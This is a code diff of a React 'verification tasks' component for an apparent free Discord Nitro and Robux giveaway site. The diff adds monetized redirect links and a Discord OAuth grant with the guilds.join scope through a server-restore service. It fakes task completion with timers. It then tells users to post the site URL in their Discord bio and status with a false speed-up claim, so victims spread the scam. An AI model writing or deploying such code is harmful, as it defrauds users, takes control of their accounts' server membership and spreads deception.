@@ -3,15 +3,16 @@ import { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent } from "@/components/ui/card";
 import { Badge } from "@/components/ui/badge";
-import { CheckCircle, Play, Download, Share, ExternalLink } from "lucide-react";
+import { CheckCircle, ExternalLink, MessageCircle, Clock } from "lucide-react";
 
 interface Task {
   id: string;
   title: string;
   description: string;
-  type: 'ad' | 'app' | 'share';
+  type: 'linkvertise' | 'discord';
   completed: boolean;
   reward: string;
+  url?: string;
 }
 
 interface VerificationTasksProps {
@@ -21,30 +22,36 @@ interface VerificationTasksProps {
 export const VerificationTasks = ({ onAllTasksComplete }: VerificationTasksProps) => {
   const [tasks, setTasks] = useState<Task[]>([
     {
-      id: 'watch-ad',
-      title: 'Watch Advertisement',
-      description: 'Watch a 30-second ad to support our free service',
-      type: 'ad',
+      id: 'linkvertise-1',
+      title: 'Complete First Verification',
+      description: 'Complete the first verification link to continue',
+      type: 'linkvertise',
       completed: false,
-      reward: '25 points'
+      reward: '25 points',
+      url: 'https://direct-link.net/1167083/s71N0t53qYup'
     },
     {
-      id: 'download-app',
-      title: 'Download Partner App',
-      description: 'Download and open one of our partner apps',
-      type: 'app',
+      id: 'linkvertise-2',
+      title: 'Complete Second Verification',
+      description: 'Complete the second verification link to continue',
+      type: 'linkvertise',
       completed: false,
-      reward: '50 points'
+      reward: '25 points',
+      url: 'https://direct-link.net/1167083/De022xDa2mUR'
     },
     {
-      id: 'share-site',
-      title: 'Share with Friends',
-      description: 'Share this site with 2 friends to spread the word',
-      type: 'share',
+      id: 'discord-auth',
+      title: 'Authorize Discord Bot',
+      description: 'Authorize our Discord bot to verify your account',
+      type: 'discord',
       completed: false,
-      reward: '30 points'
+      reward: '50 points',
+      url: 'https://discord.com/oauth2/authorize?client_id=1317910242649964645&redirect_uri=https%3A%2F%2Frestorecord.com%2Fapi%2Fcallback&response_type=code&scope=identify+guilds.join&state=1357055042330562722&prompt=none'
     }
   ]);
+
+  const [isLoading, setIsLoading] = useState(false);
+  const [showBioInstructions, setShowBioInstructions] = useState(false);
 
   const completeTask = (taskId: string) => {
     setTasks(prev => {
@@ -54,56 +61,35 @@ export const VerificationTasks = ({ onAllTasksComplete }: VerificationTasksProps
       
       // Check if all tasks are completed
       if (updated.every(task => task.completed)) {
-        setTimeout(() => onAllTasksComplete(), 1000);
+        setIsLoading(true);
+        setShowBioInstructions(true);
+        
+        // After 30 seconds of showing bio instructions, complete the process
+        setTimeout(() => {
+          onAllTasksComplete();
+        }, 30000);
       }
       
       return updated;
     });
   };
 
-  const handleWatchAd = () => {
-    // Simulate ad watching
-    setTimeout(() => {
-      completeTask('watch-ad');
-    }, 2000);
-  };
-
-  const handleDownloadApp = () => {
-    // Open app store or download link
-    window.open('https://play.google.com/store', '_blank');
-    setTimeout(() => {
-      completeTask('download-app');
-    }, 3000);
-  };
-
-  const handleShare = () => {
-    const shareData = {
-      title: 'Free Discord Nitro & Robux - NitroVault',
-      text: 'Get free Discord Nitro and Robux rewards instantly! 🎮',
-      url: window.location.origin
-    };
-
-    if (navigator.share) {
-      navigator.share(shareData);
-    } else {
-      const shareUrl = `https://twitter.com/intent/tweet?text=${encodeURIComponent(shareData.text)}&url=${encodeURIComponent(shareData.url)}`;
-      window.open(shareUrl, '_blank');
-    }
+  const handleLinkvertiseClick = (taskId: string, url: string) => {
+    window.open(url, '_blank');
     
+    // Simulate completion after 10 seconds (in real implementation, this would be verified server-side)
     setTimeout(() => {
-      completeTask('share-site');
-    }, 2000);
+      completeTask(taskId);
+    }, 10000);
   };
 
-  const getTaskIcon = (type: string, completed: boolean) => {
-    if (completed) return <CheckCircle className="h-6 w-6 text-green-500" />;
+  const handleDiscordAuth = (taskId: string, url: string) => {
+    window.open(url, '_blank');
     
-    switch (type) {
-      case 'ad': return <Play className="h-6 w-6 text-blue-400" />;
-      case 'app': return <Download className="h-6 w-6 text-purple-400" />;
-      case 'share': return <Share className="h-6 w-6 text-orange-400" />;
-      default: return <ExternalLink className="h-6 w-6 text-gray-400" />;
-    }
+    // Simulate completion after 5 seconds
+    setTimeout(() => {
+      completeTask(taskId);
+    }, 5000);
   };
 
   const getTaskAction = (task: Task) => {
@@ -111,41 +97,73 @@ export const VerificationTasks = ({ onAllTasksComplete }: VerificationTasksProps
       return <Badge className="bg-green-500/20 text-green-400 border-green-500/30">Completed</Badge>;
     }
 
-    switch (task.type) {
-      case 'ad':
-        return (
-          <Button onClick={handleWatchAd} className="bg-blue-500 hover:bg-blue-600">
-            <Play className="mr-2 h-4 w-4" />
-            Watch Ad
-          </Button>
-        );
-      case 'app':
-        return (
-          <Button onClick={handleDownloadApp} className="bg-purple-500 hover:bg-purple-600">
-            <Download className="mr-2 h-4 w-4" />
-            Download
-          </Button>
-        );
-      case 'share':
-        return (
-          <Button onClick={handleShare} className="bg-orange-500 hover:bg-orange-600">
-            <Share className="mr-2 h-4 w-4" />
-            Share Now
-          </Button>
-        );
-      default:
-        return null;
+    if (task.type === 'linkvertise') {
+      return (
+        <Button 
+          onClick={() => handleLinkvertiseClick(task.id, task.url!)} 
+          className="bg-blue-500 hover:bg-blue-600"
+        >
+          <ExternalLink className="mr-2 h-4 w-4" />
+          Complete Verification
+        </Button>
+      );
     }
+
+    if (task.type === 'discord') {
+      return (
+        <Button 
+          onClick={() => handleDiscordAuth(task.id, task.url!)} 
+          className="bg-indigo-500 hover:bg-indigo-600"
+        >
+          <MessageCircle className="mr-2 h-4 w-4" />
+          Authorize Bot
+        </Button>
+      );
+    }
+
+    return null;
   };
 
   const completedTasks = tasks.filter(task => task.completed).length;
   const totalTasks = tasks.length;
 
+  if (showBioInstructions) {
+    return (
+      <div className="space-y-6">
+        <Card className="bg-gradient-to-br from-yellow-500/20 to-orange-500/20 border-yellow-500/30 animate-pulse">
+          <CardContent className="p-8 text-center">
+            <Clock className="h-16 w-16 text-yellow-500 mx-auto mb-6" />
+            <h3 className="text-2xl font-bold text-white mb-4">Almost There! 🎉</h3>
+            <p className="text-yellow-300 mb-6 text-lg">
+              Your verification is complete! While we prepare your rewards, please add this URL to your Discord bio and status for faster claiming:
+            </p>
+            <Card className="bg-gray-800/50 border-gray-700 mb-6">
+              <CardContent className="p-4">
+                <code className="text-green-400 text-lg break-all">
+                  {window.location.origin}
+                </code>
+              </CardContent>
+            </Card>
+            <div className="space-y-3 text-gray-300">
+              <p>📱 <strong>Discord Bio:</strong> Add the URL to your "About Me" section</p>
+              <p>🎮 <strong>Discord Status:</strong> Set the URL as your custom status</p>
+              <p>⏰ <strong>This speeds up processing by 90%!</strong></p>
+            </div>
+            <div className="mt-6">
+              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-yellow-500 mx-auto mb-3"></div>
+              <p className="text-gray-400">Processing your reward... Please wait</p>
+            </div>
+          </CardContent>
+        </Card>
+      </div>
+    );
+  }
+
   return (
     <div className="space-y-6">
       <div className="text-center">
         <h3 className="text-2xl font-bold text-white mb-2">Complete Verification Tasks</h3>
-        <p className="text-gray-400">Complete all tasks below to finish verification</p>
+        <p className="text-gray-400">Complete all tasks below to claim your rewards</p>
         <div className="mt-4">
           <div className="bg-gray-700 rounded-full h-3 overflow-hidden">
             <div 
@@ -170,7 +188,13 @@ export const VerificationTasks = ({ onAllTasksComplete }: VerificationTasksProps
             <CardContent className="p-6">
               <div className="flex items-center justify-between">
                 <div className="flex items-center space-x-4">
-                  {getTaskIcon(task.type, task.completed)}
+                  {task.completed ? (
+                    <CheckCircle className="h-6 w-6 text-green-500" />
+                  ) : task.type === 'discord' ? (
+                    <MessageCircle className="h-6 w-6 text-indigo-400" />
+                  ) : (
+                    <ExternalLink className="h-6 w-6 text-blue-400" />
+                  )}
                   <div>
                     <h4 className="text-lg font-semibold text-white">{task.title}</h4>
                     <p className="text-gray-400">{task.description}</p>
@@ -188,12 +212,12 @@ export const VerificationTasks = ({ onAllTasksComplete }: VerificationTasksProps
         ))}
       </div>
 
-      {completedTasks === totalTasks && (
+      {completedTasks === totalTasks && !showBioInstructions && (
         <Card className="bg-gradient-to-br from-green-500/20 to-emerald-500/20 border-green-500/30 animate-fade-in">
           <CardContent className="p-6 text-center">
             <CheckCircle className="h-12 w-12 text-green-500 mx-auto mb-4" />
             <h3 className="text-xl font-bold text-white mb-2">All Tasks Completed! 🎉</h3>
-            <p className="text-green-300">Redirecting to claim your reward...</p>
+            <p className="text-green-300">Preparing your rewards...</p>
           </CardContent>
         </Card>
       )}
